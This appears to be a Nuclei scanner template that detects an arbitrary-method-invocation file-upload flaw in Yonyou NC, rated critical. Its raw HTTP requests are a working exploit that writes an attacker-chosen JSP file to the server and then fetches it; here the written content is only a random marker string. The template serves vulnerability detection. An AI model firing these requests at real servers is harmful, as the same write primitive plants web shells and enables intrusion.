http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200
    - status_code_2 == 200 && contains(body_2,"{{randstr_2}}")
    type: dsl
  raw:
  - 'POST /uapjs/jsinvoke/?action=invoke HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded;charset=UTF-8


    {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig",

    "parameterTypes":["java.lang.Object","java.lang.String"],

    "parameters":["{{randstr_2}}","webapps/nc_web/{{randstr_1}}.jsp"]}

    '
  - 'GET /{{randstr_1}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
id: yonyou-nc-uapjs-jsinvoke-fileupload
info:
  author: SleepingBag945
  description: "\u7528\u53CBNC \u53CA NCC\u7CFB\u7EDF\u5B58\u5728\u4EFB\u610F\u65B9\
    \u6CD5\u8C03\u7528\u6F0F\u6D1E\uFF0C\u901A\u8FC7uapjs (jsinvoke)\u5229\u7528\u6F0F\
    \u6D1E\u53EF\u8C03\u7528\u5371\u9669\u65B9\u6CD5\u9020\u6210\u653B\u51FB\u3002"
  name: "Yonyou NC uapjs jsinvoke \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E"
  severity: critical
  tags: yonyou
